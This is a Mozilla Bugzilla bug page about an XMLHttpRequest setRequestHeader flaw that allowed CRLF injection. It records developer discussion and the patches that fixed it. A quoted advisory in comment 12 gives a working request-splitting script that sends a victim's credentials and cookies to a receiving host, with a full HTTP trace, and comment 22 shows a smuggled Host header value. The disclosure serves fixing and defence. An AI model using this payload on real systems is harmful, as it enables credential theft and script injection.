=== Content from bugzilla.mozilla.org_5897b48e_20250125_150923.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/297078)
* [XML](/show_bug.cgi?ctype=xml&id=297078)

Closed
[Bug 297078](/show_bug.cgi?id=297078)

Opened 20 years ago
Closed 20 years ago

# setRequestHeader can be exploited using newline characters

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

setRequestHeader can be exploited using newline characters

## Categories

### (Core :: Networking: HTTP, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Networking%3A%20HTTP#Networking%3A%20HTTP)

Networking: HTTP
▾

Core :: Networking: HTTP
For bugs in Mozilla's HTTP networking code. This component deals with HTTP specific issues like pipelining, keep-alive, HTTP proxies, 1.1 issues, redirects, authentication (basic), etc.

Examples of appropriate bugs: Problems with proxy authentication; HTTP redirects looping indefinitely, etc.

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Networking%3A%20HTTP&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Networking%3A%20HTTP&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Networking%3A%20HTTP)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Trunk

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

x86

Windows XP

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla1.8alpha4

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |
| Accessibility Severity | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: web, Assigned: darin.moz)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/ace1cc2d025e30490cb83b98bd47a94a?d=mm&size=40)  [darin.moz](/user_profile?user_id=20048)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/a7dae3d87290768384589aa1191861b9?d=mm&size=40)  [web](/user_profile?user_id=29305)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/608e04ebca94be52b05c003d51d43e07?d=mm&size=40)  [kershaw](/user_profile?user_id=505624)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

16 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[302263](/show_bug.cgi?id=302263 "RESOLVED FIXED - XMLHttpRequest allows dangerous request headers to be set")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=297078&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=297078)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: fixed-aviary1.0.7, fixed1.7.12, fixed1.8, Whiteboard: [sg:fix] [ready to land])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[fixed-aviary1.0.7](/buglist.cgi?keywords=fixed-aviary1.0.7&resolution=---),
[fixed1.7.12](/buglist.cgi?keywords=fixed1.7.12&resolution=---),
[fixed1.8](/buglist.cgi?keywords=fixed1.8&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[sg:fix] [ready to land]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [asa](/user_profile?user_id=5003) | [blocking1.7.12](#c0 "19 years ago") | + |
| --- | --- | --- |
| [asa](/user_profile?user_id=5003) | blocking1.7.12 | + |
| --- | --- | --- |
| [asa](/user_profile?user_id=5003) | [blocking-aviary1.0.7](#c0 "19 years ago") | + |
| --- | --- | --- |
| [asa](/user_profile?user_id=5003) | blocking-aviary1.0.7 | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | [blocking1.8b5](#c0 "20 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | blocking1.8b5 | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files, 1 obsolete file)

| [v1 patch](/attachment.cgi?id=190106)  [20 years ago](#c15)  [Darin Fisher](/user_profile?user_id=20048)   6.22 KB, patch | bzbarsky : [review+](#a4085185_20209 "20 years ago")  bzbarsky : [superreview+](#a4085185_20209 "20 years ago")  dveditz : [approval1.8b4+](#c24 "20 years ago") | [Details](/attachment.cgi?id=190106&action=edit) | [Diff](/attachment.cgi?id=190106&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190106) |
| --- | --- | --- |
| [v1 follow-up patch](/attachment.cgi?id=190616)  [20 years ago](#c31)  [Darin Fisher](/user_profile?user_id=20048)   1.93 KB, patch | bzbarsky : [review+](#a4169556_20209 "20 years ago")  bzbarsky : [superreview+](#a4169556_20209 "20 years ago") | [Details](/attachment.cgi?id=190616&action=edit) | [Diff](/attachment.cgi?id=190616&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190616) |
| [v1 patch ported to the 1.7/aviary1.0.1 branch](/attachment.cgi?id=190617)  [20 years ago](#c33)  [Darin Fisher](/user_profile?user_id=20048)   5.18 KB, patch |  | [Details](/attachment.cgi?id=190617&action=edit) | [Diff](/attachment.cgi?id=190617&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190617) |
| [v1 follow-up patch (fix '\0' issue)](/attachment.cgi?id=190733)  [19 years ago](#c38)  [Darin Fisher](/user_profile?user_id=20048)   2.33 KB, patch | bzbarsky : [review+](#c40 "19 years ago")  bzbarsky : [superreview+](#c40 "19 years ago") | [Details](/attachment.cgi?id=190733&action=edit) | [Diff](/attachment.cgi?id=190733&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190733) |
| [patch for 1.7/aviary-1.0.1 branch](/attachment.cgi?id=190735)  [19 years ago](#c39)  [Darin Fisher](/user_profile?user_id=20048)   5.27 KB, patch | dbaron : [approval-aviary1.0.7+](#a8327419_3881 "19 years ago")  dbaron : [approval1.7.12+](#a8327419_3881 "19 years ago") | [Details](/attachment.cgi?id=190735&action=edit) | [Diff](/attachment.cgi?id=190735&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190735) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Tim Altman](/user_profile?user_id=29305)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=297078#c0)• 20 years ago |
|  | |

Mozilla allows the value field of XMLHttpRequest setRequestHeaders to contain
newline characters. A malicious author could use two newline characters to end
the headers sent by the client. Thus, the author has the ability to send
arbitrary data to the server. On a shared host, this could lead to data theft
situations.
I have not tested whether Mozilla allows newline characters in the the header
field of setRequestHeader, but the same problem would occur there. Furthermore,
similiar vulnerabilites could occur if Mozilla allows linefeed and carriage
return characters in header and value fields, as well as colon characters in the
header fields. I have not tested any of these situations.
I have notified Ian Hickson to update the WHAT WG spec.

|  | [Hixie (not reading bugmail)](/user_profile?user_id=4054) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=297078#c1)• 20 years ago |
|  | |

Spec updated to match IE:
# If the header or value arguments contain any U+000A or U+000D characters, or if
# the header argument contains any U+0020 or U+003A charecters, does nothing.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=297078#c2)• 20 years ago |
|  | |

> Thus, the author has the ability to send arbitrary data to the server.
That's the case with XMLHttpRequest anyway, no? See
<http://lxr.mozilla.org/seamonkey/source/extensions/xmlextras/base/public/nsIXMLHttpRequest.idl#221>
I do think that throwing on newline chars in a header may not be a bad idea, but
I think that should happen in nsHttpChannel...

|  | [Tim Altman](/user_profile?user_id=29305)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=297078#c3)• 20 years ago |
|  | |

I suppose "Thus, the author has the ability to send arbitrary header data on
behalf of the client to the server," would be more accurate.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=297078#c4)• 20 years ago |
|  | |

How is that different from what you first said? Of course all sending here is
done on behalf of the client. Again, arbitrary data can be sent even if
setRequestHeader is disabled completely.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=297078#c5)• 20 years ago |
|  | |

Can we remove the security flag? I don't see the victim here, unless you're
hacking a server with malformed requests--but that could be done much more
directly and would be a server problem.

|  | [Tim Altman](/user_profile?user_id=29305)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=297078#c6)• 20 years ago |
|  | |

(In reply to [comment #4](/show_bug.cgi?id=297078#c4 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters"))
> How is that different from what you first said? Of course all sending here is
> done on behalf of the client. Again, arbitrary data can be sent even if
> setRequestHeader is disabled completely.
It's not just any data; it's header data. The author can completely replace the
headers sent by the client. For instance, the author can add a second Host
header or create a second GET request (using any Host header) embedded in the
first.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=297078#c7)• 20 years ago |
|  | |

So, maybe in conjunction with a proxy server you might be able to make
XMLHttpRequest issue requests to other domains. Do you have a proof of concept?
Is there anyway this can be used to load content from other domains? (Probably
not, as it would seem that XMLHttpRequest would only care about the response to
the first request.)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=297078#c8)• 20 years ago |
|  | |

Darin, no need for the proxy server if the two domains share an IP (not that
uncommon out there with multihosting situations).

|  | [Hixie (not reading bugmail)](/user_profile?user_id=4054) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=297078#c9)• 20 years ago |
|  | |

In a shared-hosting scenario, the "other domain" might be at the same IP. Not
likely to be much of an issue though unless the other domain does IP-based
authorization (like the W3C does).

|  | [Tim Altman](/user_profile?user_id=29305)  Reporter |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=297078#c10)• 20 years ago |
|  | |

No, I don't have a proof of concept. It looks like Boris and Ian answered the
rest of your question.

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=297078#c11)• 20 years ago |
|  | |

This is clearly a bug, and it should be easy to fix, but Dan and I discussed its
severity as a security hole anyway.
I think this bug should be left hidden because there are many ways it could be
exploited (by making Firefox disagree with a proxy, load balancer, or shared
server about what's going on). See
<http://it.slashdot.org/article.pl?sid=05/06/12/1433206> for exploit ideas. The
most likely victim is confidential information on an intranet where some hosts
display untrusted HTML content.
Btw, does setRequestHeader allow adding a "Host:" header?Flags: blocking1.8b4?Flags: blocking-aviary1.0.7?Whiteboard: [sg:fix]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=297078#c12)• 20 years ago |
|  | |

(In reply to [comment #11](/show_bug.cgi?id=297078#c11 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters"))
> Btw, does setRequestHeader allow adding a "Host:" header?
Yes. security@mozilla.org just received this today:
================================================================
Vulnerability Report
================================================================
Software: Mozilla browsers (possibly all variants)
Versions known to be affected:
Mozilla Suite 1.7.8 (Linux)
Mozilla Firefox 1.0.4 Japanese (Windows)
Severity: very high
Kind of vulnerability:
"Request Splitting Attack" caused by XMLHTTP object.
It causes credential steal, external script injection
to any websites.
Summary:
A vulnerability for "Request Splitting Attack" exists in
Mozilla's implementation of the XMLHTTP object.
A malicious web page can split a HTTP request by injecting
CRLFs into request headers generated by XMLHTTP object.
By doing this, the attacker can redirect an request for
other websites (hereafter "target" page) and steal access
credentials (including Basic authentication passwords) and cookies.
The attack can also effectively replace the data of the target page
by any data, which leads to further cross-site scripting attacks.
Target webpages and the attack webpage must be served either from
the same IP address, or from the same proxy server. The latter case
means that "almost any sites" can be attacked when the victim user
uses a proxy server.
Exploit Example:
Assume the following domains exist:
M is the domain containing a malicious page.
V is the domain which contains a target web page.
R is the domain which receives the stolen credential.
These can be either the same domain or different, but
contents of M, V, and R must either
(1) be served from the same IP address, or
(2) be served from the same proxy server.
Then,
A victim user visits the page hosted in M, which contains
a script like the following:
<script>
xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET", "/any\_url",true);
xmlhttp.setRequestHeader("Test", "hoge\r\n\r\nPOST <http://R/record.cgi>
HTTP/1.0\r\nContent-Length: 500");
xmlhttp.onreadystatechange=function() {
if (xmlhttp.readyState==4) {
document.location = "<http://V/password/protected/site/>"
}
}
xmlhttp.send(null)
</script>
The user redirected to the target page on V. However, the request to
V is actually sent to the host R as a content of a injected POST
request. Thus, the authentication passwords and cookies for the
site V is stolen by R.
Further more The contents returned from <http://R/record.cgi> is
treated by the browser as a data came from V.
Cause:
Double CRLFs embedded in the request becomes
a record-separator of pipelined HTTP requests.
The web server handles the POST request embedded in the
string, and treat the next request to V as a data part.
The following is an example of communication between victim's
browser and a proxy server.
1 >> GET <http://M/any_url> HTTP/1.1
2 >> Host: M
3 >> User-Agent: Mozilla/5.0 (...) ...
4 >> Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,\*/\*;q=0.5
5 >> Accept-Language: ja,en;q=0.5
6 >> Accept-Encoding: gzip,deflate
7 >> Accept-Charset: EUC-JP,utf-8;q=0.7,\*;q=0.7
8 >> Keep-Alive: 300
9 >> Proxy-Connection: keep-alive
10 >> Test: hoge
11 >>
12 >> POST <http://R/record.cgi> HTTP/1.0
13 >> Content-Length: 500
14 >> Pragma: no-cache
15 >> Cache-Control: no-cache
16 >>
17 << HTTP/1.1 404 Not Found
18 << Date: Wed, 20 Jul 2005 09:35:47 GMT
19 << Server: Apache
20 << Content-Length: 299
21 << Content-Type: text/html; charset=iso-8859-1
22 << Via: 1.1 proxy
23 <<
24 << (299 bytes omitted)
25 >> GET <http://V/password/protected/site/> HTTP/1.1
26 >> Host: V
27 >> User-Agent: Mozilla/5.0 (...) ...
28 >> Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,\*/\*;q=0.5
29 >> Accept-Language: ja,en;q=0.5
30 >> Accept-Encoding: gzip,deflate
31 >> Accept-Charset: EUC-JP,utf-8;q=0.7,\*;q=0.7
32 >> Keep-Alive: 300
33 >> Proxy-Connection: keep-alive
34 >> Referer: <http://M/attack.html>
35 >> Authorization: Basic dGVzdDp0ZXN0
36 >>
37 << HTTP/1.1 200 OK
38 << Date: Wed, 20 Jul 2005 09:35:47 GMT
39 << Server: Apache
40 << Connection: close
41 << Content-Type: text/plain
42 <<
43 << Content-Length=500
44 << Request Body:
45 << GET <http://V/password/protected/site/> HTTP/1.1
46 << Host: V
47 << User-Agent: Mozilla/5.0 (...) ...
48 << Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,\*/\*;q=0.5
49 << Accept-Language: ja,en;q=0.5
50 << Accept-Encoding: gzip,deflate
51 << Accept-Charset: EUC-JP,utf-8;q=0.7,\*;q=0.7
52 << Keep-Alive: 300
53 << Proxy-Connection: keep-alive
54 << Referer: <http://M/attack.html>
55 << Authorization: Basic dGVzdDp0ZXN0
The browser send lines 1--16 as a first request.
However, since double-CRLFs are inserted at 10--11,
the proxy server only treats ll. 1--11 as the first request,
and treats ll. 12--16 as a header for the second request.
Lines 17--24 is the first response from M.
Upon receiving this response, the browser send the second
request to V, at lines 25--36. However, proxy treats these
as the body of the POST request starts from line 12.
Therefore, these data is actually forwarded to R, not to V.
The access credential included in line 35 (user test/pass test)
is sent to R, as you can see in the reply from R at line 55.
From the browser's view, the reply from R, lines 37--55, seems to
the response from V. Therefore, R can insert any script or
phishing data as if it was sent from V.
Mitigating Factors and/or Workarounds:
If proxy is not used, the attack requires both attacker
and target pages hosted in the same IP address.
This limits exploits to virtual-domain settings where
multiple users share the same web server.
If HTTP keep-alive is disabled, the two requests to
M and V is always sent on the different connection,
which prevents this attack.
Possible Fix:
Any control codes, or at least all CRs and LFs, shall be rejected
for headers (both names and values) sent via XmlHttp API. SPACEs
or COLONs shall also be rejected for header names.
Furthermore, the XmlHttp object shall not be be allowed to replace
the following headers. These can also be used to redirect
requests and/or to break HTTP conversations.
Content-Length
Host
Connection
Proxy-connection (non-standard)
Especially, depending on the behavior of the web/proxy servers,
the Content-Length header can be used for the same kind of attacks
even without embedding malicious CRLFs. I also noticed that
Mozilla allows to modify the "Host" header, which enables
redirecting a request to the virtual host on the same server.
In addition, the following headers should not be overwritable.
Referer
Date
Upgrade
Via
Note:
- This vulnerability is related with well-known server-side
vulnerability called "HTTP response splitting", but
this one is more powerful because it is performed on the
client-side.
The method stealing user secret credentials is related with
recently-reported "HTTP request smuggling" attack.
- Microsoft Internet Explorer correctly implements this by
silently ignoring all ill-formatted headers.
- A report about this vulnerability is also sent to JPCERT/CC,
Japan Computer Emergency Response Team Coordination Center.Flags: blocking1.8b4?Flags: blocking1.8b4+Flags: blocking1.7.11+Flags: blocking-aviary1.0.7?Flags: blocking-aviary1.0.7+

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=297078#c13)• 20 years ago |
|  | |

I think this should be solved at the HTTP level. There's no reason for a HTTP
channel to allow a malformed request header to be set.Assignee: general → darinComponent: DOM → Networking: HTTPQA Contact: ian → networking.http

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a3768962_20048)• 20 years ago |

Severity: normal → criticalStatus: NEW → ASSIGNEDTarget Milestone: --- → mozilla1.8alpha4

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=297078#c14)• 20 years ago |
|  | |

> # If the header or value arguments contain any U+000A or U+000D characters, or
> # if the header argument contains any U+0020 or U+003A charecters, does nothing.
Why restrict spaces and colons? That seems pretty broken to me. Why can't I
write a request header like: "Foo: x, y"?

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=297078#c15)• 20 years ago |
|  | |

Attached patch

[v1 patch](attachment.cgi?id=190106&action=diff)
— [Details](attachment.cgi?id=190106&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190106)

Candidate patch. It occured to me that SetRequestMethod can also be exploited
to affect the Request-URI. So, I created a function that checks for valid HTTP
tokens as defined by RFC 2616. I run that function against any given Method or
Header field-name. The only restriction placed on field-value is that it not
contain CR or LF. I noticed that RFC 2616 actually permits CR and LF provided
that they appear in quoted strings or are used to continue a header value on a
newline. I think it's reasonable to disallow those use cases in our API.
Hopefully, it won't break any users.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a3773687_20048)• 20 years ago |

[Attachment #190106](/attachment.cgi?id=190106&action=edit "v1 patch") -
Flags: review?(bzbarsky)

|  | [Christian :Biesinger (don't email me, ping me on IRC)](/user_profile?user_id=15661) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=297078#c16)• 20 years ago |
|  | |

Comment on [attachment 190106](/attachment.cgi?id=190106 "v1 patch") [[details]](/attachment.cgi?id=190106&action=edit "v1 patch") [[diff]](/attachment.cgi?id=190106&action=diff "v1 patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190106)
v1 patch
should stuff like \0, or really any CTL character, maybe be disallowed in
header values too?

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=297078#c17)• 20 years ago |
|  | |

> should stuff like \0, or really any CTL character, maybe be disallowed in
> header values too?
How might those be used to cause harm? I can only really imagine that they
might cause the header value to be truncated or somehow corrupted.
In addition to this patch, we might want to restrict which headers may be
modified. For example, it probably would be good to restrict the Host header.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=297078#c18)• 20 years ago |
|  | |

I'll try to get to this ASAP, but that might end up being up to a week... :(

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=297078#c19)• 20 years ago |
|  | |

(In reply to [comment #17](/show_bug.cgi?id=297078#c17 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters"))
> In addition to this patch, we might want to restrict which headers may be
> modified. For example, it probably would be good to restrict the Host header.
See [comment 12](/show_bug.cgi?id=297078#c12 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters") for some more headers that should be restricted.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=297078#c20)• 20 years ago |
|  | |

Some of the header restrictions are probably better placed in the XMLHttpRequest
code. Some can be done at the HTTP level, but we need to take care not to
overly restrict our HTTP API since that also restricts what fully privileged
code may do.

|  | [Jonas Sicking (:sicking) No longer reading bugmail consistently](/user_profile?user_id=9186) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=297078#c21)• 20 years ago |
|  | |

\0 is always a bit scary, though I don't know if we've actually had any security
exploits from it ever. What tends to happen is that some functions honor the
length parameter when using a string, while other just use a char\* and get a
truncated string. If the security check is done on one of these values and the
actual executing code uses the other then there can be a security exploit.
So if it doesn't matter much either way from a functionality point of view I
think it might be good to restrict \0.
Another thing I thought of: You mention that values can be split up into several
lines if quoted. We have to ensure that something we intend to be a terminated
value doesn't end up 'leaking' onto the next line eating up the next header when
parsed by the server.
But reading rfc 822 it seems like as long as each header starts with a non-LWSP
char it will be parsed as a distinct header. And you seem to enforce this in the
headername. So this attack should be covered too, right?

|  | [Hixie (not reading bugmail)](/user_profile?user_id=4054) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=297078#c22)• 20 years ago |
|  | |

>> # If the header or value arguments contain any U+000A or U+000D characters,
>> # or if the header argument contains any U+0020 or U+003A charecters, does
>> # nothing.
>
> Why restrict spaces and colons? That seems pretty broken to me. Why can't I
> write a request header like: "Foo: x, y"?
You can. There are two arguments, header and value. They get sent as:
header: value
The "header" part is not allowed to have spaces or colons because otherwise you
could set it to something like "Host: evil.example.com" and the value to "80"
and we would send something like:
Host: evil.example.com: 80
...which is clearly not good, and wouldn't get caught by a security check for
the "Host" header.
The spec also details which headers should be allowed or disallowed, see:
<http://whatwg.org/specs/web-apps/current-work/#setrequestheader>
I haven't updated it to take into account the comments sent over the last few
weeks though, sorry.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a4085185_20209)• 20 years ago |

[Attachment #190106](/attachment.cgi?id=190106&action=edit "v1 patch") -
Flags: superreview+
[Attachment #190106](/attachment.cgi?id=190106&action=edit "v1 patch") -
Flags: review?(bzbarsky)
[Attachment #190106](/attachment.cgi?id=190106&action=edit "v1 patch") -
Flags: review+

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a4092272_20048)• 20 years ago |

[Attachment #190106](/attachment.cgi?id=190106&action=edit "v1 patch") -
Flags: approval1.8b4?

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=297078#c23)• 20 years ago |
|  | |

Ian: I believe I was confused by your use of the term "header argument". At any
rate, your explanation above matches my thinking. You will notice that my patch
implements a strict check on the set of characters allowed in a header name. I
basically implemented the BNF for "token" defined by RFC 2616.
Right now, I am only disallowing U+000A and U+000D in the header value. Jonas
makes the case for disallowing U+0000 as well. I will add that to the patch
assuming that no one objects.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=297078#c24)• 20 years ago |
|  | |

Comment on [attachment 190106](/attachment.cgi?id=190106 "v1 patch") [[details]](/attachment.cgi?id=190106&action=edit "v1 patch") [[diff]](/attachment.cgi?id=190106&action=diff "v1 patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190106)
v1 patch
a=dveditz
[Attachment #190106](/attachment.cgi?id=190106&action=edit "v1 patch") -
Flags: approval1.8b4? → approval1.8b4+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=297078#c25)• 20 years ago |
|  | |

The advisory in [comment #12](/show_bug.cgi?id=297078#c12 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters") is from Yutaka Oiwa

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=297078#c26)• 20 years ago |
|  | |

Yutaka Oiwa sent additional information:
> I have two updates to the original report:
>
> 1) Transfer-encoding: header is also found to cause malformed HTTP header.
>
> HTTP 1.1 specifies that Content-length should be ignored when
> "Transfer-encoding: chunked" is given. However, Mozilla generates
> a request like following:
>
> POST /a HTTP/1.1
> Host: localhost
> User-Agent: Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:1.7.8) Gecko/20050513
Debian/1.7.8-1
> Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,\*/\*;q=0.5
